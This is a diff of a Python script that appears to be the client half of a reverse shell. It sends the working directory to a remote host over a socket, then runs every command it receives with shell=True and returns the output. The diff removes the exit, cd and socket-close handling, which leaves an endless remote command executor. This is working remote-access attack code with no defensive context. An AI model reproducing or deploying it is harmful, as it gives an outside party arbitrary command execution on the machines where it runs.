@@ -28,38 +28,12 @@ s.send(cwd.encode()) #Sends the cwd to the Host
 while True:
     command = s.recv(Size).decode()
 
+    CMD = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+    s.send(CMD.stdout.read() )
+    s.send(CMD.stderr.read())
 
 
 
-
-
-
-
-
-    splited = command.split()
-
-    if command.lower() == "exit":
-        break
-
-    if splited[0].lower == "cd":
-        try:
-            os.chdir(' '.join(splited[1:]))
-
-        except FileNotFoundError as e:
-            output = str(e)
-
-        else:
-            output = ""
-else:
-    output = subprocess.getoutput(command) #Need to fix in order to get the output from command 
-
-cwd = os.getcwd()
-
-message = f"{output}{SEPARATOR}{cwd}" 
-
-s.send(message.encode())
-
-s.close()
 
 
 
